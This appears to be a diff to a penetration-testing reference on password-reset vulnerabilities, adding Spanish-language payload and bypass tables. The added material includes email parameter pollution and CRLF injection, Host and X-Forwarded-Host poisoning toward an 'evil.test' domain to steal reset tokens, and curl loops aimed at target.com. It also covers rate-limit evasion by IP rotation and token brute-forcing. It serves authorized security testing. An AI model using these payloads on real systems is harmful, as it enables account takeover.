@@ -107,6 +107,52 @@ chains_with: [host-header, rate-limiting, session-management]
 - `curl` for scripted token request/redemption cycles.
 - A disposable mailbox (your own test domain) to receive tokens programmatically if automating entropy collection.
 
+## Payloads & Detection Patterns
+
+Guía de caza del flujo de recuperación. Una familia por defecto del flujo; la mecánica de
+inyección de Host en profundidad vive en `host-header` y aquí se compone con ella.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Email param pollution | `email=victim&email=attacker`, array `{"email":["victim","attacker"]}`, CC vía CRLF `email=victim%0d%0acc:attacker` | Redirigir el token a una dirección controlada por el atacante |
+| Host/proxy header poisoning | `Host: evil`, `X-Forwarded-Host`, `X-Original-Host`, `X-Forwarded-Server`, `Forwarded: host=evil` | Envenenar el dominio del link de reset (exfil del token) |
+| Token entropy probe | Colectar 20–50 tokens → Burp Sequencer; `md5(email)`/timestamp/user-id check | Detectar PRNG débil o derivación predecible del token |
+| Token reuse/expiry | Redimir un token ya usado o fuera de ventana | `single-use` y `expiry` no enforced server-side |
+| Token non-invalidation | Pedir token2, redimir token1 | El viejo outstanding no se invalida al emitir uno nuevo |
+| Enumeration oracle | Diff de body/length/timing: email existente vs inexistente | User enumeration (combina con rate-limiting) |
+
+Surface signals que delatan la clase antes de probar:
+- Token en la URL (`?token=`, `?code=`, `?key=`) — anotar longitud/charset para entropía.
+- El endpoint acepta `email` como parámetro (vs. lookup atado a sesión) → pollution posible.
+- Flujo multi-paso (request → link → set) sin binding evidente a la *misma* request/identidad.
+- Links de reset con dominio derivado del `Host`/headers de la request → poisoning (ver `host-header`).
+
+```bash
+# Email pollution: dos formas (duplicado y array JSON) sobre dos cuentas de prueba propias
+curl -s -i -X POST https://target.com/forgot-password \
+  -d "email=victim@yourdomain.com&email=attacker@yourdomain.com"
+curl -s -i -X POST https://target.com/forgot-password -H 'Content-Type: application/json' \
+  -d '{"email":["victim@yourdomain.com","attacker@yourdomain.com"]}'
+
+# Host/proxy header sweep: revisar en el inbox de prueba si algún link apunta a evil.test
+for hdr in "X-Forwarded-Host: evil.test" "X-Original-Host: evil.test" "Forwarded: host=evil.test"; do
+  curl -s -X POST https://target.com/forgot-password -H "$hdr" -d "email=testuser@yourdomain.com"
+done
+```
+
+## Bypass Techniques
+
+Agrupadas por el control del flujo que evaden; la nota es la condición que la delata.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| `Host` fijado en el vhost | `X-Forwarded-Host`, `X-Original-Host`, `Forwarded: host=` | Muchos reverse-proxy (nginx/Apache/Cloudflare) pasan XFH aunque `Host` esté locked |
+| Binding a una sola identidad | Email duplicado/array/secundario (`user_id`) | El limiter/validador elige una, el mailer usa otra |
+| Rate limit en el request de reset | Rotar IP/`X-Forwarded-For` (chain `rate-limiting`) | Habilita colectar tokens para entropía o brute de redención |
+| Entropía fuerte del token | Brute si el token es corto/numérico y no hay RL en redención | Chain `rate-limiting`; sin RL un token de 6 dígitos cae |
+| Ventana de expiry | Usar el token justo dentro de la ventana / clock skew | Mail delivery delay puede alargar el test — planear el timing |
+| URL-rebuild del framework | `get_host()`/`url()`/`request.host` confían headers | Frameworks reconstruyen el link desde headers por default |
+
 ## Root Causes
 
 - Reset token generated from a weak PRNG, a predictable seed (timestamp, user ID, email hash without a secret/salt), or insufficient length/entropy.
